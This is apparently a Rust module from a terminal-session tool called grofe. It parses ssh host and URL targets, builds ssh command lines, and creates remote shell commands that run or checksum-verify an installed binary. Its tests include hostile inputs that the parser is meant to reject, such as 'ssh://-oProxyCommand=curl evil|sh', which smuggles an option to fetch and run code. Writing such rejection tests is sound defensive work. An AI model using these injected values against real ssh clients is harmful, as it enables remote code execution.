//! Where a remote session lives and how ssh reaches it (spec ssh-remote
//! §2): `grofe -r <host>` and `ssh://[user@]host[:port][/session]` targets,
//! and the `ssh` command lines the client runs.

use std::process::{Command, Stdio};

use crate::util::quote::sh;

/// The environment variable naming the ssh program (default `ssh`). Tests
/// point it at a fake ssh that runs the remote command locally.
pub const SSH_ENV: &str = "GROFE_SSH";

/// The exit status of the remote command when no grofe is found there.
pub const MISSING_STATUS: i32 = 127;

/// The line the remote command prints on stderr when no grofe is found.
pub const MISSING_MARKER: &str = "grofe-remote: grofe not found";

/// A remote host as ssh takes it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Target {
    /// `host` or `user@host`: anything ssh accepts, aliases included.
    pub dest: String,
    pub port: Option<u16>,
    /// The session an `ssh://` URL names.
    pub session: Option<String>,
}

impl Target {
    /// `grofe -r <host>`: the host as given, once [`check_dest`] allows it.
    pub fn parse_host(dest: &str) -> Result<Target, String> {
        check_dest(dest)?;
        Ok(Target::host(dest))
    }

    /// A target for `dest` without checks; callers with user input use
    /// [`Target::parse_host`] or [`parse_url`].
    pub fn host(dest: &str) -> Target {
        Target {
            dest: dest.to_string(),
            port: None,
            session: None,
        }
    }

    /// The host part of `dest`, without a user, for messages.
    pub fn host_name(&self) -> &str {
        self.dest.rsplit_once('@').map_or(&self.dest, |(_, h)| h)
    }
}

/// Refuses a user or host ssh could take for an option or that a shell
/// could split: empty, starting with `-`, or holding whitespace or control
/// characters. (`--` before the destination already stops ssh reading it as
/// an option; this keeps a hostile name out of every message too.)
pub fn check_part(what: &str, s: &str) -> Result<(), String> {
    if s.is_empty() {
        return Err(format!("empty {what}"));
    }
    if s.starts_with('-') {
        return Err(format!("{what} {} starts with -", sanitize(s)));
    }
    if s.chars().any(|c| c.is_whitespace() || c.is_control()) {
        return Err(format!(
            "{what} {} holds a space or control character",
            sanitize(s)
        ));
    }
    Ok(())
}

/// [`check_part`] on both halves of `user@host`.
pub fn check_dest(dest: &str) -> Result<(), String> {
    let bad = |e: String| format!("bad host {}: {e}", sanitize(dest));
    match dest.rsplit_once('@') {
        Some((user, host)) => {
            check_part("user", user).map_err(bad)?;
            check_part("host", host).map_err(bad)
        }
        None => check_part("host", dest).map_err(bad),
    }
}

/// Most characters of remote-controlled text shown.
const SHOWN_MAX: usize = 2000;

/// Remote-controlled text made safe to print on a terminal: C0 and C1
/// controls and DEL (except newline and tab) become visible escapes, and
/// the text is cut at [`SHOWN_MAX`] characters.
pub fn sanitize(s: &str) -> String {
    let mut out = String::new();
    for (n, c) in s.chars().enumerate() {
        if n >= SHOWN_MAX {
            out.push_str("...");
            break;
        }
        match c {
            '\n' | '\t' => out.push(c),
            c if c.is_control() => out.push_str(&c.escape_unicode().to_string()),
            c => out.push(c),
        }
    }
    out
}

/// `ssh://[user@]host[:port][/session]`; an IPv6 host is in brackets.
pub fn parse_url(url: &str) -> Result<Target, String> {
    let bad = |why: &str| format!("bad ssh URL {}: {why}", sanitize(url));
    let rest = url
        .strip_prefix("ssh://")
        .ok_or_else(|| bad("it must start with ssh://"))?;
    let (authority, session) = match rest.split_once('/') {
        Some((a, s)) => (a, (!s.is_empty()).then(|| s.to_string())),
        None => (rest, None),
    };
    if authority.contains('%') {
        return Err(bad("percent escapes are not taken"));
    }
    let (user, hostport) = match authority.rsplit_once('@') {
        Some((u, _)) if u.contains(':') => return Err(bad("a password in the URL is not taken")),
        Some((u, h)) if !u.is_empty() => (Some(u), h),
        Some(_) => return Err(bad("empty user")),
        None => (None, authority),
    };
    let (host, port) = if let Some(inner) = hostport.strip_prefix('[') {
        let (host, after) = inner
            .split_once(']')
            .ok_or_else(|| bad("unclosed [ in the host"))?;
        match after {
            "" => (host, None),
            _ => match after.strip_prefix(':') {
                Some(p) => (host, Some(p)),
                None => return Err(bad("text after ]")),
            },
        }
    } else {
        match hostport.split_once(':') {
            Some((h, p)) => (h, Some(p)),
            None => (hostport, None),
        }
    };
    if host.is_empty() {
        return Err(bad("no host"));
    }
    let port = match port {
        None => None,
        Some(p) => match p.parse::<u16>() {
            Ok(n) if n > 0 && p.bytes().all(|b| b.is_ascii_digit()) => Some(n),
            _ => return Err(bad(&format!("bad port {p:?}"))),
        },
    };
    if let Some(u) = user {
        check_part("user", u).map_err(|e| bad(&e))?;
    }
    check_part("host", host).map_err(|e| bad(&e))?;
    let dest = match user {
        Some(u) => format!("{u}@{host}"),
        None => host.to_string(),
    };
    Ok(Target {
        dest,
        port,
        session,
    })
}

/// A [`Command`] for the ssh program whose child starts with no signal
/// blocked (see [`unblock_signals`]).
pub fn command() -> Command {
    let mut cmd = Command::new(program());
    unblock_signals(&mut cmd);
    cmd
}

/// Makes `cmd`'s child start with an empty signal mask. The attach client
/// blocks SIGTERM, SIGHUP, SIGINT, SIGQUIT and SIGWINCH in every thread for
/// its `sigwait` thread, and a blocked mask survives `fork` and `exec`: an
/// ssh started for a reconnect would otherwise ignore them.
pub fn unblock_signals(cmd: &mut Command) -> &mut Command {
    use nix::sys::signal::{SigSet, SigmaskHow, sigprocmask};
    use std::os::unix::process::CommandExt;
    // SAFETY: sigprocmask is async-signal-safe; nothing else runs between
    // fork and exec.
    unsafe {
        cmd.pre_exec(|| {
            sigprocmask(SigmaskHow::SIG_SETMASK, Some(&SigSet::empty()), None)
                .map_err(std::io::Error::from)
        });
    }
    cmd
}

/// The ssh program: `$GROFE_SSH`, else `ssh`.
pub fn program() -> String {
    std::env::var(SSH_ENV)
        .ok()
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| "ssh".to_string())
}

/// Which of the keepalive options grofe adds: each only when the user set
/// no value of their own for it.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct Keepalive {
    /// `ServerAliveInterval=15`.
    pub interval: bool,
    /// `ServerAliveCountMax=2`.
    pub count: bool,
}

impl Keepalive {
    /// Both options.
    pub const BOTH: Keepalive = Keepalive {
        interval: true,
        count: true,
    };
}

/// The keepalive options to add, from `ssh -G` output, which prints
/// defaults too: `serveraliveinterval 0` is ssh's unset default, and so is
/// `serveralivecountmax 3`.
// ponytail: a user who set ServerAliveCountMax to exactly 3 looks unset
// and gets 2; `ssh -G` cannot tell the two apart.
pub fn keepalive_from(ssh_g: &str) -> Keepalive {
    let value = |key: &str| {
        ssh_g.lines().find_map(|l| {
            let mut words = l.split_whitespace();
            let k = words.next()?;
            k.eq_ignore_ascii_case(key)
                .then(|| words.next().unwrap_or("").to_string())
        })
    };
    Keepalive {
        interval: value("serveraliveinterval").is_none_or(|v| v == "0"),
        count: value("serveralivecountmax").is_none_or(|v| v == "3"),
    }
}

/// Options for one ssh run.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct SshOpts {
    /// The keepalive options to add.
    pub keepalive: Keepalive,
    /// `BatchMode=yes`: never prompt (a reconnect runs with the tty raw).
    pub batch: bool,
}

/// `ssh -T [-p port] [-o ...] -- <dest> <remote command>`: `--` before the
/// destination, so a destination can never be read as an option.
pub fn argv(target: &Target, opts: SshOpts, remote: &str) -> Vec<String> {
    let mut out = vec!["-T".to_string()];
    if let Some(p) = target.port {
        out.extend(["-p".to_string(), p.to_string()]);
    }
    if opts.keepalive.interval {
        out.extend(["-o", "ServerAliveInterval=15"].map(String::from));
    }
    if opts.keepalive.count {
        out.extend(["-o", "ServerAliveCountMax=2"].map(String::from));
    }
    if opts.batch {
        out.extend(["-o", "BatchMode=yes"].map(String::from));
    }
    out.extend(["--".to_string(), target.dest.clone(), remote.to_string()]);
    out
}

/// The keepalive options to add for `target` ([`keepalive_from`] on its
/// `ssh -G`). If `ssh -G` fails, both; ssh's own run will report why.
pub fn wants_keepalive(target: &Target) -> Keepalive {
    let mut cmd = command();
    cmd.arg("-G");
    if let Some(p) = target.port {
        cmd.args(["-p", &p.to_string()]);
    }
    cmd.arg("--")
        .arg(&target.dest)
        .stdin(Stdio::null())
        .stderr(Stdio::null());
    match cmd.output() {
        Ok(out) if out.status.success() => keepalive_from(&String::from_utf8_lossy(&out.stdout)),
        _ => Keepalive::BOTH,
    }
}

/// The directory, relative to the remote `$HOME`, a bootstrap installs
/// grofe `version` into.
pub fn install_dir(version: &str) -> String {
    format!(".local/share/grofe/bin/{version}")
}

/// The remote command that runs `grofe proxy`: wrapped in `sh -c` so it
/// works whatever the remote login shell is.
///
/// Ruling: the versioned install is preferred over a `grofe` on `PATH`
/// when it exists, because a `PATH` grofe that is incompatible would
/// otherwise win every time after a bootstrap installed the right one.
/// Cost: a user who upgrades the `PATH` grofe keeps using the installed
/// one until it is removed.
pub fn proxy_command(version: &str) -> String {
    remote_grofe(version, "proxy")
}

/// As [`proxy_command`], running `grofe <args>` (`proxy --quic`, R7).
pub fn remote_grofe(version: &str, args: &str) -> String {
    let script = format!(
        "b=\"$HOME/{dir}/grofe\"; \
         if [ -x \"$b\" ]; then exec \"$b\" {args}; fi; \
         if command -v grofe >/dev/null 2>&1; then exec grofe {args}; fi; \
         echo {marker} >&2; exit {MISSING_STATUS}",
        dir = install_dir(version),
        marker = sh(MISSING_MARKER),
    );
    format!("sh -c {}", sh(&script))
}

/// The remote command that stores its stdin as the versioned grofe: into a
/// temporary name, promoted with `mv` only when it is `len` bytes and (where
/// `sha256sum` or `shasum` exists there) has SHA-256 `sha256`; else the
/// temporary file is removed and the command fails.
pub fn install_command(version: &str, len: usize, sha256: &str) -> String {
    let script = format!(
        "d=\"$HOME/{dir}\"; t=\"$d/grofe.tmp.$$\"; \
         mkdir -p \"$d\" && cat > \"$t\" && \
         [ \"$(wc -c < \"$t\" | tr -d ' ')\" = {len} ] && \
         {{ if command -v sha256sum >/dev/null 2>&1; then s=$(sha256sum \"$t\"); \
         elif command -v shasum >/dev/null 2>&1; then s=$(shasum -a 256 \"$t\"); \
         else s={sha256}; fi; [ \"${{s%% *}}\" = {sha256} ]; }} && \
         chmod 755 \"$t\" && mv \"$t\" \"$d/grofe\" || \
         {{ rm -f \"$t\"; echo 'grofe: the copy arrived damaged; nothing was installed' >&2; exit 1; }}",
        dir = install_dir(version),
    );
    format!("sh -c {}", sh(&script))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn url(s: &str) -> Target {
        parse_url(s).unwrap()
    }

    #[test]
    fn urls_with_user_port_and_session_parse() {
        assert_eq!(url("ssh://box"), Target::host("box"));
        assert_eq!(
            url("ssh://me@box:2222/work"),
            Target {
                dest: "me@box".into(),
                port: Some(2222),
                session: Some("work".into()),
            }
        );
        assert_eq!(url("ssh://box/").session, None);
        assert_eq!(url("ssh://box/a/b").session.as_deref(), Some("a/b"));
    }

    #[test]
    fn an_ipv6_host_is_in_brackets() {
        let t = url("ssh://me@[::1]:22/s");
        assert_eq!((t.dest.as_str(), t.port), ("me@::1", Some(22)));
        assert_eq!(url("ssh://[fe80::1]").dest, "fe80::1");
        assert!(parse_url("ssh://[::1").is_err());
        assert!(parse_url("ssh://[::1]x").is_err());
    }

    #[test]
    fn bad_urls_are_refused() {
        for bad in [
            "box",
            "ssh://",
            "ssh://box:",
            "ssh://box:0",
            "ssh://box:99999",
            "ssh://box:x",
            "ssh://@box",
            "ssh://-oProxyCommand=curl evil|sh",
            "ssh://-oX=y@h",
            "ssh://me@-oX=y",
            "ssh://u:p@h",
            "ssh://h:+22",
            "ssh://h%41",
            "ssh://me@h ost",
            "ssh://me@h\x1b[2J",
        ] {
            assert!(parse_url(bad).is_err(), "{bad}");
        }
    }

    #[test]
    fn hosts_that_look_like_options_are_refused() {
        for bad in [
            "-oFoo",
            "-oProxyCommand=x",
            "me@-oX",
            "-me@h",
            "",
            "a b",
            "h\n",
        ] {
            assert!(Target::parse_host(bad).is_err(), "{bad:?}");
        }
        for good in ["box", "me@box", "me@::1", "alias.example"] {
            assert_eq!(Target::parse_host(good).unwrap().dest, good);
        }
    }

    #[test]
    fn sanitize_makes_controls_visible_and_caps_length() {
        assert_eq!(
            sanitize("a\x1b[2Jb\n\tc\x7f\u{9b}"),
            "a\\u{1b}[2Jb\n\tc\\u{7f}\\u{9b}"
        );
        let long = "x".repeat(5000);
        assert!(sanitize(&long).len() < 2100);
    }

    #[test]
    fn host_name_drops_the_user() {
        assert_eq!(url("ssh://me@box").host_name(), "box");
        assert_eq!(Target::host("box").host_name(), "box");
    }

    #[test]
    fn each_keepalive_option_is_added_only_when_the_user_left_it_unset() {
        let both_unset = "user me\nserveraliveinterval 0\nserveralivecountmax 3\nport 22\n";
        assert_eq!(keepalive_from(both_unset), Keepalive::BOTH);
        let interval_set = "serveraliveinterval 30\nserveralivecountmax 3\n";
        assert_eq!(
            keepalive_from(interval_set),
            Keepalive {
                interval: false,
                count: true
            }
        );
        let count_set = "serveraliveinterval 0\nserveralivecountmax 5\n";
        assert_eq!(
            keepalive_from(count_set),
            Keepalive {
                interval: true,
                count: false
            }
        );
        let both_set = "serveraliveinterval 30\nserveralivecountmax 5\n";
        assert_eq!(keepalive_from(both_set), Keepalive::default());
        // An ssh that prints neither: both added.
        assert_eq!(keepalive_from("port 22\n"), Keepalive::BOTH);
        // Only the one asked for goes on the command line.
        let only_count = argv(
            &Target::host("box"),
            SshOpts {
                keepalive: Keepalive {
                    interval: false,
                    count: true,
                },
                batch: false,
            },
            "cmd",
        );
        assert_eq!(
            only_count,
            ["-T", "-o", "ServerAliveCountMax=2", "--", "box", "cmd"]
        );
    }

    #[test]
    fn ssh_argv_adds_keepalives_only_when_asked() {
        let t = url("ssh://me@box:2222");
        let with = argv(
            &t,
            SshOpts {
                keepalive: Keepalive::BOTH,
                batch: false,
            },
            "cmd",
        );
        assert_eq!(
            with,
            [
                "-T",
                "-p",
                "2222",
                "-o",
                "ServerAliveInterval=15",
                "-o",
                "ServerAliveCountMax=2",
                "--",
                "me@box",
                "cmd"
            ]
        );
        let without = argv(&Target::host("box"), SshOpts::default(), "cmd");
        assert_eq!(without, ["-T", "--", "box", "cmd"]);
        let batch = argv(
            &Target::host("box"),
            SshOpts {
                keepalive: Keepalive::default(),
                batch: true,
            },
            "cmd",
        );
        assert_eq!(batch, ["-T", "-o", "BatchMode=yes", "--", "box", "cmd"]);
    }

    #[test]
    fn the_proxy_command_prefers_the_versioned_install_then_path() {
        let cmd = proxy_command("1.2.3");
        assert!(cmd.starts_with("sh -c '"), "{cmd}");
        let versioned = cmd.find(".local/share/grofe/bin/1.2.3/grofe").unwrap();
        let path = cmd.find("exec grofe proxy").unwrap();
        assert!(versioned < path);
        assert!(cmd.contains("exit 127"));
    }

    /// The commands really run under `sh`: no grofe anywhere gives the
    /// marker and 127; an installed one is run.
    #[test]
    fn the_proxy_and_install_commands_run_under_sh() {
        let home = tempfile::tempdir().unwrap();
        let run = |cmd: &str, input: &[u8]| {
            use std::io::Write;
            let mut child = Command::new("/bin/sh")
                .arg("-c")
                .arg(cmd)
                .env("HOME", home.path())
                .env("PATH", "/usr/bin:/bin")
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
                .unwrap();
            child.stdin.take().unwrap().write_all(input).unwrap();
            child.wait_with_output().unwrap()
        };
        let out = run(&proxy_command("9.9.9"), b"");
        assert_eq!(out.status.code(), Some(MISSING_STATUS));
        assert!(String::from_utf8_lossy(&out.stderr).contains(MISSING_MARKER));

        let bin = b"#!/bin/sh\necho proxy-ran \"$@\"\n";
        let sum = crate::remote::bootstrap::hex(&crate::remote::bootstrap::sha256(bin));
        let installed = home.path().join(".local/share/grofe/bin/9.9.9/grofe");
        // A short copy or a wrong sum is refused and leaves nothing behind.
        let out = run(&install_command("9.9.9", bin.len(), &sum), &bin[..10]);
        assert!(!out.status.success(), "{out:?}");
        assert!(String::from_utf8_lossy(&out.stderr).contains("damaged"));
        let zeros = "0".repeat(64);
        let out = run(&install_command("9.9.9", bin.len(), &zeros), bin);
        assert!(!out.status.success(), "{out:?}");
        assert!(!installed.exists());
        let leftovers = std::fs::read_dir(installed.parent().unwrap())
            .unwrap()
            .count();
        assert_eq!(leftovers, 0, "no temporary file stays");

        let out = run(&install_command("9.9.9", bin.len(), &sum), bin);
        assert!(out.status.success(), "{out:?}");
        let out = run(&proxy_command("9.9.9"), b"");
        assert_eq!(String::from_utf8_lossy(&out.stdout), "proxy-ran proxy\n");
    }

    /// A child of a thread with SIGTERM blocked still dies of SIGTERM.
    #[test]
    fn ssh_children_start_with_no_signal_blocked() {
        use nix::sys::signal::{SigSet, Signal};
        let status = std::thread::spawn(|| {
            let mut set = SigSet::empty();
            set.add(Signal::SIGTERM);
            set.thread_block().unwrap();
            let mut cmd = Command::new("/bin/sh");
            cmd.args(["-c", "kill -TERM $$; sleep 5; exit 3"]);
            unblock_signals(&mut cmd).status().unwrap()
        })
        .join()
        .unwrap();
        use std::os::unix::process::ExitStatusExt;
        assert_eq!(status.signal(), Some(Signal::SIGTERM as i32), "{status:?}");
    }

    #[test]
    fn shell_quote_survives_quotes() {
        assert_eq!(sh("a'b"), r"'a'\''b'");
    }
}
